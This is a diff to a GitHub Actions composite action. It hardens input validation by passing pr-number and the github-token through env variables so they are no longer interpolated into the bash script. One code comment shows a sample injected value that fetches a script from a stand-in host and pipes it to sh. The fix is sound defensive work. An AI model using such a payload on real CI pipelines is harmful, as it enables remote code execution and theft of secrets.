@@ -106,17 +106,25 @@ runs:
     - name: Validate PR comment inputs
       if: inputs.post-comment == 'true'
       shell: bash
+      env:
+        # Never interpolate ${{ inputs.* }} directly into a run: string - GitHub
+        # substitutes it into the script text before bash sees it, so a value
+        # containing a stray quote (e.g. pr-number = '0"; curl evil.sh | sh; echo "')
+        # runs as injected shell, not as the string this code is meant to validate.
+        # Routing through env: and quoting "$VAR" keeps it as inert data instead.
+        PR_NUMBER: ${{ inputs.pr-number }}
+        GITHUB_TOKEN_INPUT: ${{ inputs.github-token }}
       run: |
         set -euo pipefail
-        if [ -z "${{ inputs.pr-number }}" ]; then
+        if [ -z "$PR_NUMBER" ]; then
           echo "::error::post-comment is true but pr-number was not provided."
           exit 1
         fi
-        if ! [[ "${{ inputs.pr-number }}" =~ ^[0-9]+$ ]]; then
-          echo "::error::pr-number must be a positive integer, got '${{ inputs.pr-number }}'."
+        if ! [[ "$PR_NUMBER" =~ ^[0-9]+$ ]]; then
+          echo "::error::pr-number must be a positive integer, got '${PR_NUMBER}'."
           exit 1
         fi
-        if [ -z "${{ inputs.github-token }}" ]; then
+        if [ -z "$GITHUB_TOKEN_INPUT" ]; then
           echo "::error::post-comment is true but github-token was not provided."
           exit 1
         fi
